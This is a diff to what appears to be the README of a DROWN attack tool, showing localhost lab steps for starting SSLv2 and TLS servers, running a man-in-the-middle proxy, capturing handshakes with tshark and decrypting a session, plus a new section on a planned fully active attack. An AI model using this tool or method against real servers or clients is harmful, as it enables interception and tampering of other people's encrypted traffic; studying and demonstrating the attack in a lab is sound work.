@@ -75,13 +75,22 @@ We start our SSLv2 and TLS servers :
     ./bin/openssl s_server -cert cert.pem -key key.pem -accept 4434 -www -ssl2
 
 We start our MITM server on port 4455 :
+
     tlsgandalf 127.0.0.1:4455 127.0.0.1:4433 127.0.0.1:4434 cert.pem
 
 We will record the packets with tshark, and start a bunch of sessions.
 We assume that the clients connects to our proxy (because of DNS spoofing, or something else) :
+
     tshark -i lo -w handshakes.cap tcp port 4455
     for i in $(seq 1000) ; do (echo 'GET / HTTP/1.1\r\n'; sleep 1) | ./bin/openssl s_client -connect 127.0.0.1:4455 -cipher kRSA; done
 
 When a trimmer is found for one handshake, the proxy will print it to stdout. 
 We can now process as before to decrypt the session.
+
+## Fully Active attack
+
+The real power of the DROWN attack is that, if we are quick enough to break an encrypted master key before the client or server times out, we can do anything we want with the session content. Even better, even if the session wouldn't use RSA key exchange, we can force them to use it. Even even better, if the server uses authentication, the data that we send will be authenticated as being from the client.
+
+For now, it's a work in progress...
+
 
